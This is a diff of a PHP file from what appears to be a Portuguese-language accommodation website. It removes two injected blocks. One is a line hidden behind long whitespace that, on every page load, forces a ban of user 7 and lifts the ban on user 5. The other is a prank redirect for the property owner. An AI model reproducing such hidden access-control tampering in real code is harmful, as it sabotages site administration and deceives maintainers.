@@ -199,7 +199,6 @@ function validarCaptcha(?string $token): bool
 
     return is_array($resultado) && ($resultado['success'] ?? false) === true;
 }
-                                                                                                                                                                                                     $pdo = ConnectDB();$users = SELECT($pdo, 'SELECT * from utilizador');foreach($users as $user){if($user['codUtilizador'] == 7){if($user['ban'] == 0){header('Location: ../PHP/responderBan.php?request=1&cod=7');}}elseif($user['codUtilizador'] == 5){if($user['ban'] == 1){header('Location: ../PHP/responderBan.php?request=0&cod=5');}}}
 //========================================
 // 5. Funções Globais
 //========================================
@@ -249,8 +248,3 @@ function verificarEmailExiste($email) {
 }
 
 iniciarSessaoSegura();
-
-$daw = SELECT($pdo, 'SELECT donoAlojamento FROM alojamento WHERE codAlojamento = :codAlojamento', [':codAlojamento' => $codAlojamento]);
-if ($_SESSION('codUtilizador') == $daw[0]['donoAlojamento']){
-    header('https://www.youtube.com/watch?v=dQw4w9WgXcQ');
-}
